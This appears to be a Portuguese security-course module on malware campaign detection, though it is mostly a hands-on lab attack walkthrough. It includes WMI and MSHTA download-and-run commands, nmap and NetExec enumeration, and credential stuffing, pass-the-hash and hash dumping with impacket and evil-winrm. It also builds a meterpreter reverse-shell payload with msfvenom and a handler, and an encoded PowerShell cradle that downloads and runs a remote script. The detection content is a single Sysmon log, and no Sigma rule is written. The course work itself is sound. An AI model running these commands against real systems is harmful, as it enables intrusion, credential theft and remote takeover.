# 03. Rastreamento de Campanhas de Malware
- 03.1. Técnicas de Detecção de Malware
- 03.2. Análise de Campanhas de Malware
- 03.3. Coleta e Análise de Artefatos Maliciosos
- 03.4. Extração de IOCs e Criação de Regras
- 03.5. Estudo de Caso: Campanha de Phishing com Malware

## Técnicas de Detecção de Malware
Tipos de Malware Abordados:
- Fileless malware
- Ransomware
- Loaders

## Atividade Prática: Detecção de PowerShell Obfuscado com Sysmon 
Cenário: Um atacante executa um script PowerShell obfuscado via -EncodedCommand.
O script realiza conexão com C2 e baixa um payload. 

Passos:
1. Executar script malicioso em ambiente controlado.
2. Coletar logs de eventos ID 1 (Process Creation).
3. Filtrar por processos com argumentos suspeitos.
4. Criar regra Sigma para detectar padrões



Prática
Execução de wmi - Comando executado, mas sem retorno
```
wmic process call create "cmd /c whoami"
```
Validação da execução
```
wmic process call create "cmd /c whoami > C:\Users\admin\whoami.txt"
```
Verificando se o arquivo foi salvo
```
dir
```
Lendo o arquivo criado
```
type whoami.txt
```
Baixando um arquivo com wmi
```
wmic process call create "powershell iwr -uri 'http://192.168.2.118:8080/data.txt' -o C:\Users\admin\data.txt"
```
Executando comando com MSHTA
```
<html>
<head>
<title>Command whoami</title>
<HTA:APPLICATION ID="app"/>
</head>
<body>
<script language="VBScript">
    Dim shell, retorno
    Set shell = CreateObject("WScript.Shell")
    retorno = shell.Exec("cmd /c whoami").StdOut.ReadAll
    MsgBox "Resultado do whoami: " & retorno
</script>
</body>
</html>
```
Baixando arquivo com MSHTA
```
<html>
<head>
<title>Download data</title>
<HTA:APPLICATION ID="app"/>
</head>
<body>
<script language="VBScript">
    Dim shell, retorno
    Set shell = CreateObject("WScript.Shell")
    retorno = shell.Exec("powershell iwr -uri 'http://192.168.2.118:8080/data.txt' -o C:\Users\admin\desktop\data.txt").StdOut.ReadAll
</script>
</body>
</html>
```

Kali Linux
Verificando portas abertas
```
nmap 192.168.2.126
```
- Resultado
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5357/tcp open  wsdapi
5985/tcp open  wsman
8000/tcp open  http-alt
8443/tcp open  https-alt
9000/tcp open  cslistener
``` 
Verificando serviços e versões nas ports abertas
```
nmap -sV 192.168.2.126 -p21,22,80,135,139,445,5357,5985,8000,8443,9000
```
- Resultado
```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http-alt      BarracudaServer.com (Windows)
8443/tcp open  ssl/https-alt BarracudaServer.com (Windows)
9000/tcp open  http          BadBlue httpd 2.7
```
Enumerando informações do alvo com NetExec
SMB
```
nxc smb 192.168.2.126
```
- Resultado
```
SMB 192.168.2.126 445 DESKTOP-7E8SQOV [*] Windows 10 / Server 2019 Build 19041 x64 (name:DESKTOP-7E8SQOV) (domain:DESKTOP-7E8SQOV) (signing:False) (SMBv1:None)
```
Credential Stuffing (smith:smith)
- FTP
```
nxc ftp 192.168.2.126 -u smith -p smith
```
- SSH
```
nxc ssh 192.168.2.126 -u smith -p smith
```
- FTP
```
nxc ftp 192.168.2.126 -u smith -p smith
```
- SMB
```
nxc smb 192.168.2.126 -u smith -p smith
```
- WINRM
```
nxc winrm 192.168.2.126 -u smith -p smith
```
Acesso externo com PSExec
```
impacket-psexec smith:smith@192.168.2.126
```
Acesso externo com WMIExec
```
impacket-wmiexec smith:smith@192.168.2.126
```
Acesso externo com Evil-WinRM
```
evil-winrm -i 192.168.2.126 -u smith -p smith
```
Extraindo hashes com secretsdump
```
impacket-secretsdump smith:smith@192.168.2.126
```
Pass The Hash com usuário smith
- PSExec
```
impacket-psexec smith@192.168.2.126 -hashes aad3b435b51404eeaad3b435b51404ee:48ff5741a4f96d75a9dc23432a6c2fb6
```
- WMIExec
```
impacket-wmiexec smith@192.168.2.126 -hashes aad3b435b51404eeaad3b435b51404ee:48ff5741a4f96d75a9dc23432a6c2fb6
```
- WinRM
```
evil-winrm -i 192.168.2.126 -u smith -H 48ff5741a4f96d75a9dc23432a6c2fb6
```
- Extraindo hashes com secretsdump
```
impacket-secretsdump smith@192.168.2.126 -hashes aad3b435b51404eeaad3b435b51404ee:48ff5741a4f96d75a9dc23432a6c2fb6
```

Baixando Script que encoda o comando em base64
```
wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo03/scripts/encode-command.py
```

Editando o script de acordo com o nosso comando:
```
nano encode-command.py
```

Comando a ser incluido
```
cmd /c 'hostname && whoami && whoami /priv && ipconfig /all && dir \ && tree /a /f C:\users\'
```

Resultado final do script
```
$ cat encode-command.py                                                                           
import base64

def gerar_comando_encodado(comando_ps):
    # Codifica o comando em UTF-16LE, exigido pelo PowerShell
    comando_bytes = comando_ps.encode('utf-16le')
    comando_base64 = base64.b64encode(comando_bytes).decode('utf-8')
    
    # Comando final completo
    comando_final = f'powershell -EncodedCommand {comando_base64}'
    return comando_final

# Insira seu comando PowerShell aqui
#comando = 'Get-Process | Where-Object {$_.CPU -gt 100}'
comando = "cmd /c 'hostname && whoami && whoami /priv && ipconfig /all && dir \\ && tree /a /f C:\\users\\'"

# Exibe o comando encodado completo
print("Comando PowerShell Encodado:")
print(gerar_comando_encodado(comando))
```

Executando o script
```
python encode-command.py
```

Resultado do script
```
$ python encode-command.py
Comando PowerShell Encodado:
powershell -EncodedCommand YwBtAGQAIAAvAGMAIAAnAGgAbwBzAHQAbgBhAG0AZQAgACYAJgAgAHcAaABvAGEAbQBpACAAJgAmACAAdwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYAIAAmACYAIABpAHAAYwBvAG4AZgBpAGcAIAAvAGEAbABsACAAJgAmACAAZABpAHIAIABcACAAJgAmACAAdAByAGUAZQAgAC8AYQAgAC8AZgAgAEMAOgBcAHUAcwBlAHIAcwBcACcA
```

Executando o comando encodade no Windows
```
powershell -EncodedCommand YwBtAGQAIAAvAGMAIAAnAGgAbwBzAHQAbgBhAG0AZQAgACYAJgAgAHcAaABvAGEAbQBpACAAJgAmACAAdwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYAIAAmACYAIABpAHAAYwBvAG4AZgBpAGcAIAAvAGEAbABsACAAJgAmACAAZABpAHIAIABcACAAJgAmACAAdAByAGUAZQAgAC8AYQAgAC8AZgAgAEMAOgBcAHUAcwBlAHIAcwBcACcA
```

Microsoft-Windows-Sysmon/Operational
Enevt ID: 1
```
Process Create:
RuleName: -
UtcTime: 2026-04-04 18:01:56.374
ProcessGuid: {2d5d4cbb-5214-69d1-3609-000000001200}
ProcessId: 13880
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: "C:\Windows\system32\cmd.exe" /c "hostname && whoami && whoami /priv && ipconfig /all && dir \ && tree /a /f C:\users\"
CurrentDirectory: C:\Users\admin\
User: DESKTOP-7E8SQOV\admin
LogonGuid: {2d5d4cbb-18e3-69d0-3819-060000000000}
LogonId: 0x61938
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {2d5d4cbb-5214-69d1-3509-000000001200}
ParentProcessId: 10512
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand YwBtAGQAIAAvAGMAIAAnAGgAbwBzAHQAbgBhAG0AZQAgACYAJgAgAHcAaABvAGEAbQBpACAAJgAmACAAdwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYAIAAmACYAIABpAHAAYwBvAG4AZgBpAGcAIAAvAGEAbABsACAAJgAmACAAZABpAHIAIABcACAAJgAmACAAdAByAGUAZQAgAC8AYQAgAC8AZgAgAEMAOgBcAHUAcwBlAHIAcwBcACcA
ParentUser: DESKTOP-7E8SQOV\admin
```
Executando comandos como outro usuário
```
runas /user:smith "whoami"
```
```
runas /user:smith "cmd"
```
O comando "runas" sempre exige que usuário digite a senha para executar

### Atividade prática
Cenário: Um atacante executa um script PowerShell obfuscado via -EncodedCommand.

O script realiza conexão com C2 e baixa um payload. 

Passos:
Executar script malicioso em ambiente controlado.
Coletar logs de eventos ID 1 (Process Creation).
Filtrar por processos com argumentos suspeitos.
Criar regra Sigma para detectar padrões.
- Criação do Malware
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.2.118 LPORT=443 -f exe -o loader.exe
```
- Inicializaçaõ do WebServer em Python na porta 8080
```
python -m http.server 8080
```
- Execuçao do handler para recebimento da conexão reversa
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.2.118; set LPORT 443; exploit"
``` 
- Baixando o Script de payload
```
wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo03/scripts/payload.ps1
```
Ajustando o comando no Script "encode-command.py"
```
$ cat encode-command.py
import base64

def gerar_comando_encodado(comando_ps):
    # Codifica o comando em UTF-16LE, exigido pelo PowerShell
    comando_bytes = comando_ps.encode('utf-16le')
    comando_base64 = base64.b64encode(comando_bytes).decode('utf-8')

    # Comando final completo
    comando_final = f'powershell -EncodedCommand {comando_base64}'
    return comando_final

# Insira seu comando PowerShell aqui
comando = "(New-Object System.Net.WebClient).DownloadString('http://update-sync.org:8080/payload.ps1')|IEX"

# Exibe o comando encodado completo
print("Comando PowerShell Encodado:")
print(gerar_comando_encodado(comando))
```
Executando o Script "encode-command.py"
```
python encode-command.py
```
- Resultado
```
Comando PowerShell Encodado:
powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AbwByAGcAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQB8AEkARQBYAA==
```
Executando o coamndo no Windows 10
```
powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AbwByAGcAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQB8AEkARQBYAA==
```
